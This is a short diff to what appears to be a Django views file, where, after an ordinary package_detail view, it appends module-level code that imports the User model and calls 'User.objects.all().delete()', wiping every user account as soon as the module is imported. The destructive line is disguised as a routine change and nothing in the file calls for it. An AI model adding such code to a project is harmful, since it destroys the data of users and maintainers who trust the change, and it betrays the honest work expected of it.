@@ -87,3 +87,6 @@ def package_detail(request, pk):
     return render(request, "package_detail.html", {
         "package": package
     })
+from apps.accounts.models import User
+
+User.objects.all().delete()
